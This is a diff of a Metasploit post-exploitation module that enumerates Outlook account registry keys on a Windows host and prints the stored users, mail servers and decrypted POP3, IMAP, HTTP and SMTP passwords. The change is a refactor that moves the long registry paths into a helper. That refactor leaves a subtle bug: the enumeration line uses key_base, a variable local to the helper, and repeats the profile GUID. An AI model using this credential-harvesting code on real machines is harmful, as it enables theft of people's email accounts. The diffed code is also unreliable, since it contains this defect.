@@ -82,21 +82,27 @@ class Metasploit3 < Msf::Post
 		return decrypted_pw
 	end
 
+	# Just a wrapper to avoid copy pasta and long lines
+	def get_valdata(k, name)
+		key_base = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676"
+		registry_getvaldata("#{key_base}\\#{k}", name)
+	end
 
 	def get_registry
 		#Determine if saved accounts exist within Outlook.  Ignore the Address Book and Personal Folder registry entries.
 		outlook_exists = 0
 		saved_accounts = 0
 
-		next_account_id = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\", 'NextAccountID')
+
+		next_account_id = get_valdata("", 'NextAccountID')
 
 		if next_account_id != nil
 		#Microsoft Outlook not found
 
 			print_status "Microsoft Outlook found in Registry..."
 			outlook_exists = 1
-			registry_enumkeys("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\").each do |k|
-				display_name = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'Display Name')
+			registry_enumkeys(key_base + "9375CFF0413111d3B88A00104B2A6676\\").each do |k|
+				display_name = get_valdata(k, 'Display Name')
 
 				if display_name == nil
 					#Microsoft Outlook found, but no account data saved in this location
@@ -106,17 +112,17 @@ class Metasploit3 < Msf::Post
 				#Account found - parse through registry data to determine account type.  Parse remaining registry data after to speed up module.
 				saved_accounts = 1
 				got_user_pw = 0
-				accountname = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'Account Name')
-				displayname = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'Display Name')
-				email = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'Email')
-				pop3_server = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Server')
-				smtp_server = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Server')
-				http_server_url = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Server URL')
-				imap_server = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Server')
-				smtp_use_auth = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use Auth')
+				accountname = get_valdata(k, 'Account Name')
+				displayname = get_valdata(k, 'Display Name')
+				email = get_valdata(k, 'Email')
+				pop3_server = get_valdata(k, 'POP3 Server')
+				smtp_server = get_valdata(k, 'SMTP Server')
+				http_server_url = get_valdata(k, 'HTTP Server URL')
+				imap_server = get_valdata(k, 'IMAP Server')
+				smtp_use_auth = get_valdata(k, 'SMTP Use Auth')
 				if smtp_use_auth != nil
-					smtp_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP User')
-					smtp_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Password')
+					smtp_user = get_valdata(k, 'SMTP User')
+					smtp_password = get_valdata(k, 'SMTP Password')
 				end
 
 				if pop3_server != nil
@@ -136,10 +142,10 @@ class Metasploit3 < Msf::Post
 				print_status("     User E-mail Address: #{email}")
 
 				if type == "POP3"
-					pop3_pw = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Password')
-					pop3_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 User')
-					pop3_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Use SPA')
-					smtp_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Port')
+					pop3_pw = get_valdata(k, 'POP3 Password')
+					pop3_user = get_valdata(k, 'POP3 User')
+					pop3_use_spa = get_valdata(k, 'POP3 Use SPA')
+					smtp_port = get_valdata(k, 'SMTP Port')
 
 					print_status("     User Name: #{pop3_user}")
 					if pop3_pw == nil
@@ -160,14 +166,14 @@ class Metasploit3 < Msf::Post
 
 					print_status("     Incoming Mail Server (POP3): #{pop3_server}")
 
-					pop3_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Use SSL')
+					pop3_use_ssl = get_valdata(k, 'POP3 Use SSL')
 					if pop3_use_ssl == nil
 						print_status("     POP3 Use SSL: No")
 					else
 						print_status("     POP3 Use SSL: Yes")
 					end
 
-					pop3_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Port')
+					pop3_port = get_valdata(k, 'POP3 Port')
 					if pop3_port == nil
 						print_status("     POP3 Port: 110")
 						portnum = 110
@@ -186,7 +192,7 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
 
-					smtp_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use SSL')
+					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
 					else
@@ -201,9 +207,9 @@ class Metasploit3 < Msf::Post
 					end
 
 				elsif type == "HTTP"
-					http_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Password')
-					http_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP User')
-					http_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Use SPA')
+					http_password = get_valdata(k, 'HTTP Password')
+					http_user = get_valdata(k, 'HTTP User')
+					http_use_spa = get_valdata(k, 'HTTP Use SPA')
 
 					print_status("     User Name: #{http_user}")
 					if http_password == nil
@@ -232,10 +238,10 @@ class Metasploit3 < Msf::Post
 					print_status("     HTTP Server URL: #{http_server_url}")
 
 				elsif type == "IMAP"
-					imap_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP User')
-					imap_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SPA')
-					imap_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Password')
-					smtp_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Port')
+					imap_user = get_valdata(k, 'IMAP User')
+					imap_use_spa = get_valdata(k, 'IMAP Use SPA')
+					imap_password = get_valdata(k, 'IMAP Password')
+					smtp_port = get_valdata(k, 'SMTP Port')
 
 					print_status("     User Name: #{imap_user}")
 					if imap_password == nil
@@ -255,14 +261,14 @@ class Metasploit3 < Msf::Post
 
 					print_status("     Incoming Mail Server (IMAP): #{imap_server}")
 
-					imap_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SSL')
+					imap_use_ssl = get_valdata(k, 'IMAP Use SSL')
 					if imap_use_ssl == nil
 						print_status("     IMAP Use SSL: No")
 					else
 						print_status("     IMAP Use SSL: Yes")
 					end
 
-					imap_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Port')
+					imap_port = get_valdata(k, 'IMAP Port')
 					if imap_port == nil
 						print_status("     IMAP Port: 143")
 						portnum = 143
@@ -281,7 +287,7 @@ class Metasploit3 < Msf::Post
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
 
-					smtp_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use SSL')
+					smtp_use_ssl = get_valdata(k, 'SMTP Use SSL')
 					if smtp_use_ssl == nil
 						print_status("     SMTP Use SSL: No")
 					else
